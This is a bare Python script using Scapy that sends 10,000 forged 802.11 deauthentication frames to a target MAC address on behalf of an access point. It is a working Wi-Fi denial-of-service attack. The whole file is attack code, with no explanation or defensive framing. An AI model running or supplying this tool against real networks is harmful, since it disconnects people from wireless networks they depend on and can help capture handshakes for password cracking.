from scapy.all import *
import sys

if len(sys.argv) < 4:
    sys.exit()

pkt = RadioTap()/Dot11(addr1=sys.argv[1], addr2=sys.argv[2], addr3=sys.argv[2])/Dot11Deauth(reason=7)
sendp(pkt, iface=sys.argv[3], count=10000, inter=0.01, verbose=1)
